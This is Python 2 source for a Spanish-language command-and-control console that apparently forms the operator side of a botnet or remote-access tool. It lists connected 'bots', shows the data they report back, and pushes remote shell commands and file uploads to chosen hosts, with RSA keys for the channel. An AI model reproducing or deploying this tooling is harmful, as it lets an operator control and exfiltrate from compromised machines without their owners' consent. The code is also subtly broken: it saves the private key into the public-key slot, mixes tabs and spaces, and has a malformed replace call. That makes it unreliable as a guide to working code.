# -*- coding: UTF-8 -*-

import cmd
import sys
import shelve
from modules import POO_RSA as rsa
from utils import client_interact
from utils import is_value_in_array
from os.path import isfile, splitext, isdir
from os import makedirs
from os import listdir
from os import system as shell_exec
from utils import invoke_quit
from time import sleep
from utils import quest
from utils import yield_print
from utils import modify_char
from platform import system

class center_of_command_and_control(cmd.Cmd):

    ruler = '='
    doc_header = 'Comandos principales'
    misc_header = 'Comandos secundarios'
    undoc_header = 'Comandos opcionales'
    nohelp = 'No hay ayuda para el comando: "%s"'

    def help_shell(self):
	
        print(modify_char.modify("Puede ejecutar tanto un comando local (Destinado a esta maquina) o remoto (Destinado a una terminal remota). Para conexiones remotas use: shell remote <DirecciÃ³n objetivo> <comandos remotos>"))

    def do_shell(self, args):

	try:

	    if (args[:5].lower() == 'local'):

		shell_exec(args[6:])

	    elif (args[:6].lower() == 'remote'):

		if not (self.db_code['my_public_key'] == None):

		    host = args[7:].split()[0]
		    rcmd = args[7+len(host)+1:]

		    for key, value in self.clients_to_socket.items():

		        if (key == host):

		            if (rcmd.split()[0].lower() == 'upload'):

		                file_to_upload = rcmd[7:]

		                if (isfile(file_to_upload)):

		                    with open(file_to_upload, 'rb') as file_to_upload_read:

		                        client_interact.send(value, self.db_code['my_public_key'], 'upload/%s %s' % (file_to_upload_read.read().encode("hex"), file_to_upload))

		                else:

		                    print('El archivo que usted intenta subir no existe ...')

		            else:

		                client_interact.send(value, self.db_code['my_public_key'], rcmd)
		                
		            break

		else:

		    print(modify_char.modify('Falta definir la clave pÃºblica del destinatario'))

	    else:

		print('No se encuentra el subcomando: "%s"' % (args.replace(args.split()[0]+' ', '')))	    

	except IndexError:

	    print(self.indexerror)

    def help_set(self):
	
        print(modify_char.modify("""
subcomandos:

    - key: Ajusta el valor de la clave pÃºblica o privada. Use la siguiente sintaxis: "key <del> o <add> <public <clave>> o <private <clave>>"
        """))

    def do_set(self, args):

	try:

	    if (args.split()[0].lower() == 'key'):

		if (args.split()[1].lower() == 'del'):

		    if (args.split()[2].lower() == 'public'):

		        self.db_code['my_public_key'] = None

		    elif (args.split()[2].lower() == 'private'):

		        self.db_code['my_private_key'] = None

		    else:

		        print(self.subcommand_error % (args.replace(args.split()[0]+' '+args.split()[1]+' ', '')))


		elif (args.split()[1].lower() == 'add'):

		    if (args.split()[2].lower() == 'public'):
		            
		        pub_key = args.replace(args.split()[0]+' '+args.split()[1]+' '+args.split()[2]+' ', '')

		        try:

		            rsa.main().import_PublicKey(pub_key)
		            self.db_code['my_public_key'] = pub_key
		        
		        except rsa.invalidKeys as Except:

		            print(str(Except))

		    elif (args.split()[2].lower() == 'private'):

		        priv_key = args.replace(args.split()[0]+' '+args.split()[1]+' '+args.split()[2]+' ', '') 

		        try:

		            rsa.main().import_PrivateKey(priv_key)
		            
		            self.db_code['my_public_key'] = priv_key

		        except rsa.invalidKeys as Except:

		            print(str(Except))

		    else:

		        print(self.subcommand_error % (args.replace(args.split()[0]+' '+args.split()[1]+' ', '')))

		else:

		    print(self.subcommand_error % (args.replace(args.split()[0]+' ', '')))

        except IndexError:

	    print(self.indexerror)

    def help_show(self):
	
	    print(modify_char.modify("""
subcomandos:

    - clients: Muestra los clientes que estan conectados
    - data: Muestra los datos recibidos por los bots. Use la siguiente sintaxis para mostrar los datos de un bot especifico: "data <direcciÃ³n>"
    - keys: Muestra las llaves de cifrado asimetricas
    - key: Muestra o la llave privada o la pÃºblica configurables. Use la siguiente sintaxis para mostrar la privada o la pÃºblica: "key <public> o <private>"
        """))

    def do_show(self, args):

	try:

	    if (args.split()[0].lower() == self.show_commands[0]):

		clients = self.clients

		if (len(clients) > 0):

		    clients_table = []
		    clients_table.append(['Clientes - (%d)' % (len(clients))])

		    for _ in clients:

		        clients_table.append([_])

		    clients_table_maximum = self.config['style']['table_style'](clients_table)
		    clients_table_maximum.title = 'Clientes'

		    print(clients_table_maximum.table)

		else:

		    print('No hay clientes conectados ...')

	    elif (args.split()[0].lower() == self.show_commands[1]):

		if (len(self.clients_for_interact) > 0):

		    try:

		        bot_addr_pattern = args.split()[1]

		    except IndexError:

		        bot_addr_pattern = False

		    bot_print = True # Imprimir el mensaje de todas formas, aunque se evaluara el resultado despues
		    bot_table = []
		    bot_table.append(['ID', modify_char.modify('DirecciÃ³n'), 'Longitud', 'Datos'])

		    for index in self.clients_for_interact:

		        for bot_object, bot_object_data in index.items():

		            bot_array_to_append = True

		            bot_length = bot_object_data['length']
		            bot_data = bot_object_data['data']
		            bot_addr = bot_object[:-36]
		            bot_id = bot_object[-36:][4:]

                            if not (bot_addr_pattern == False):

                                if not (bot_addr == bot_addr_pattern):

                                    bot_array_to_append = False

                            if (bot_array_to_append):

                                bot_array_data = [bot_id, bot_addr, bot_length, bot_data]

                                bot_table.append(bot_array_data)

		    if (len(bot_table) > 1):

			if not (system() == 'Windows'):

			    bot_table_maximum = self.config['style']['table_style'](bot_table)
					
			    if not (bot_table_maximum.ok):

				bot_print = quest.quest(modify_char.modify("Los datos no se mostraran correctamente con la resoluciÃ³n actual. Â¿Desea mostrarlos con otro formato?"), '1', '0')

				bot_print = not bot_print

			else:
				
			    bot_print = False

			if (bot_print):

			    print(bot_table_maximum.table)

			else:

                            bot_table_format = yield_print.array_new_format(bot_table)
                            bot_table_format_headers = bot_table_format.next()
                            bot_table_format_id = 0

			    while True:

				try:

				    bot_table_info = bot_table_format.next()

				    bot_table_format_id += 1

				    print(modify_char.modify("[%d] - ID: %s; DirecciÃ³n: %s; Longitud: %d; Mensaje: %s" % (bot_table_format_id, str(bot_table_info[0]), bot_table_info[1], int(bot_table_info[2]), bot_table_info[3])))

				except StopIteration:

				    break

		    else:

			print('No se agregaron valores a la tabla de datos!')

		else:

		    print('No hay datos para mostrar ...')

	    elif (args.split()[0].lower() == self.show_commands[3]):

		if (args.split()[1].lower() == 'private'):

		    if not (self.db_code['my_private_key'] == None):

		        print('Clave Privada: ' + str(self.db_code['my_private_key']))

		    else:

		        print('Falta definir la clave privada')

		elif (args.split()[1].lower() == 'public'):

		    if not (self.db_code['my_public_key'] == None):

		        print(modify_char.modify('Clave PÃºblica: ' + str(self.db_code['my_public_key'])))

		    else:

		        print(modify_char.modify('Falta definir la clave pÃºblica'))

		else:

		    print(self.subcommand_error % (args.replace(args.split()[0]+' '+args.split()[1]+' ')))


	    elif (args.split()[0].lower() == self.show_commands[2]):

		print(modify_char.modify('Clave PÃºblica: ' + str(self.rsa.export_PublicKey())))
		print('Clave Privada: ' + str(self.rsa.export_PrivateKey()))

	    else:

		print(self.subcommand_error % (args.replace(args.split()[0]+' ', '')))

	except IndexError:

	    print(self.indexerror)

    def do_quit(self, args):

        return True

    def help_help(self):

        print('Comando para ver los comandos documentados. Especifica con help <comando>')

    def complete_show(self, text, line, begidx, endidx):

        try:

            pattern = line.split()[1].lower()

        except IndexError:

            pattern = False

        if (pattern == self.show_commands[1]):

            return [x for x in self.clients if x.startswith(text)]
        
        elif (pattern == self.show_commands[3]):

            return [x for x in self.show_subcommand_key if x.startswith(text)]

        else:

            return [x for x in self.show_commands if x.startswith(text)]

    def complete_shell(self, text, line, begidx, endidx):

        try:

            pattern = line.split()[1].lower()

        except IndexError:

            pattern = False

        if (pattern == self.shell_commands[0]):

            return [x for x in self.clients if x.startswith(text)]

        else:

            return [x for x in self.shell_commands if x.startswith(text)]

    def complete_set(self, text, line, begidx, endidx):

        try:

            pattern = line.split()[1].lower()

        except IndexError:

            pattern = False

        try:

            pattern_sub = line.split()[2].lower()

        except IndexError:

            pattern_sub = False

        if (pattern == self.set_commands[0]):

            if (pattern_sub == self.set_subcommands[0]):

                return [x for x in self.set_subcommand_add if x.startswith(text)]

            elif (pattern_sub == self.set_subcommands[1]):

                return [x for x in self.set_subcommand_del if x.startswith(text)]

            else:

                return [x for x in self.set_subcommands if x.startswith(text)]

        else:

            return [x for x in self.set_commands if x.startswith(text)]

    def default(self, args):

        if not (args == 'EOF'):

            print('Error ejecutando la sentencia: %s' % (str(args)))
        
        else:

            return True

    def postloop(self):

        print('Saliendo! ...')

        try:

            self.server_obj.shutdown(1)
	    self.server_obj.close()
			
	    for client, client_socket in self.clients_to_socket.items():

		client_socket.close() 

		self.db_code.close()

        except:
		
            pass

    def preloop(self):

        keys_settings = self.config['keys_setting']

        self.rsa = rsa.main()

        generate_keys = False

        try:

            keys = self.db_code['keys']

            if (len(keys) < 2):

                generate_keys = True

        except KeyError:

            generate_keys = True

        if (generate_keys):

            print('No se localizaron las claves asimetricas!')
            print(modify_char.modify('Seleccione el tamaÃ±o en BITS de las claves:'))

            bitsize = raw_input(modify_char.modify("TamaÃ±o en bits [%d]: " % (keys_settings['bitsize'])))

            if not (bitsize):

                bitsize = keys_settings['bitsize']

            bitsize = int(bitsize)

            print(modify_char.modify('El tiempo de la generaciÃ³n puede variar dependiendo del tamaÃ±o de bits y de las capacidades de su computador!'))
            print('Generando ...')
            
            self.rsa.generate(bitsize)

            print('Escribiendo claves en el disco ...')

            self.db_code['my_public_key'] = self.rsa.export_PublicKey()
            self.db_code['my_private_key'] = self.rsa.export_PrivateKey()
            self.db_code['keys'] = self.rsa.export()

            print('Hecho!')

        else:

            self.rsa.import_PublicKey(self.db_code['keys'][0])
            self.rsa.import_PrivateKey(self.db_code['keys'][1])

    def emptyline(self):

        pass

class main:

    def __init__(self):

        self.server_obj = None
        self.clients = []
        self.clients_to_socket = {}
        self.clients_for_interact = []
        self.config = None

    def entry_mode_init(self):

        c2c = center_of_command_and_control()
        c2c.server_obj = self.server_obj
        c2c.config = self.config
        #c2c.intro = """"""
        c2c.show_commands = ['clients', 'data', 'keys', 'key']
        c2c.show_subcommand_key = ['public', 'private']
        c2c.shell_commands = ['remote', 'local']
        # Comando set
        c2c.set_commands = ['key']
        c2c.set_subcommands = ['add', 'del']
        c2c.set_subcommand_add = ['public', 'private']
        c2c.set_subcommand_del = ['public', 'private']
	c2c.indexerror = 'Faltan parametros por definir!'
        c2c.subcommand_error = 'No se encuentra el subcomando: "%s"' # Cuando hay un error con un subcomando
        c2c.clients_to_socket = self.clients_to_socket
        c2c.clients = self.clients
        c2c.clients_for_interact = self.clients_for_interact
        c2c.prompt = self.config['style']['input_string']
        c2c.db_code = shelve.open(self.config['shelve_setting'])

        try:
        
            c2c.cmdloop()

        except KeyboardInterrupt:

            sys.exit(0)

        except Exception as Except:

            print(str(Except))
